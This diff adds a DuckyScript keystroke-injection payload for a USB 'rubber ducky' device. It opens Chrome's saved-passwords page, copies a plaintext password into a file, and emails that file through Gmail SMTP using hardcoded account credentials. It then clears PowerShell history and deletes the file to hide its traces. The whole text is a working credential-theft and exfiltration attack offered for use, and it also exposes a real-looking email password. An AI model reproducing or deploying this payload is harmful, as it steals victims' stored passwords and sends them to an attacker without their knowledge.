@@ -1,0 +1,109 @@
+
+DELAY 1000
+REM -------------open chrome
+GUI r
+DELAY 1000
+STRING chrome
+DELAY 1000
+ENTER
+DELAY 1000
+REM -------------copy plaintext password
+STRING chrome://settings/passwords
+ENTER
+DELAY 1000
+STRING Email
+DELAY 500
+TAB
+DELAY 500
+DOWN
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+ALT D
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+CTRL c
+DELAY 500
+ALT F4
+DELAY 500
+REM -------------save file to music folder as passwords.txt
+GUI r
+DELAY 500
+STRING powershell start-process notepad.exe -Verb runAs
+DELAY 500 
+ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+CTRL v
+DELAY 500
+ALT f
+DELAY 500
+STRING s
+DELAY 500
+STRING passwords.txt
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+STRING c
+DELAY 1000
+STRING l
+DELAY 500
+ENTER
+DELAY 500
+ALT s
+DELAY 1000
+ALT F4
+DELAY 500
+REM -------------email log via gmail
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $EmailFrom = “rubber257@gmail.com”
+ENTER
+STRING $EmailTo = “sharmajijvs2@gmail.com”
+ENTER
+STRING $Subject = “Test 001”
+ENTER
+STRING $Body = “hacked sucessfully "
+ENTER
+STRING $Body = (Get-Content C:\passwords.txt | out-string)
+ENTER
+STRING $SMTPServer = “smtp.gmail.com”
+ENTER
+STRING $SMTPClient = New-Object System.Net.Mail.SmtpClient($SmtpServer, 587) 
+ENTER
+STRING $SMTPClient.EnableSsl = $true
+ENTER
+STRING $SMTPClient.Credentials = New-Object System.Net.NetworkCredential(“rubber257@gmail.com”, “Sjay@5992”);
+ENTER
+STRING $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
+ENTER
+STRING Clear-History
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+STRING del C:\passwords.txt
+ENTER
+STRING exit
+ENTER
+ENTER 
